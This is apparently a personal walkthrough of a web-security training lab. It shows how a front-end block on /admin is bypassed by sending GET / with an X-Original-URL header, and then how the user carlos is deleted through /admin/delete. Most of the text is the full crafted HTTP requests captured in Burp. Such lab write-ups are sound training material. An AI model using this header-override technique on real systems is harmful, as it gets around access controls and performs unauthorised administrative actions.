*This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header. To solve the lab, access the admin panel and delete the user carlos.*

Tried access `/admin` only to be received with a *Access Denied* message. 

I reloaded the page and intercepted the request with Burp Intercept to observe the output: 
```
GET /admin HTTP/2
Host: 0a9a0060044b330880903a8a00f90027.web-security-academy.net
Cookie: session=6Ia1S6nYhrzlxpjg8oBjKE4hONwlzoJd
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9a0060044b330880903a8a00f90027.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

Since they said that the backend framework supports X-Original-URL header, we can try to include it to overwrite the block placed by the front-end system. I modified the request to the following using Burp Repeater : 

```Burp 
GET / HTTP/2
Host: 0a9a0060044b330880903a8a00f90027.web-security-academy.net
X-Original-Url : /admin
Cookie: session=6Ia1S6nYhrzlxpjg8oBjKE4hONwlzoJd
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9a0060044b330880903a8a00f90027.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

I was able to access the page as the full page was shown in the response. I then modified the request to the following: 
```Burp 
GET /?username=carlos HTTP/2
Host: 0a9a0060044b330880903a8a00f90027.web-security-academy.net
Cookie: session=6Ia1S6nYhrzlxpjg8oBjKE4hONwlzoJd
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9a0060044b330880903a8a00f90027.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
X-Original-Url : /admin/delete
```

Solved!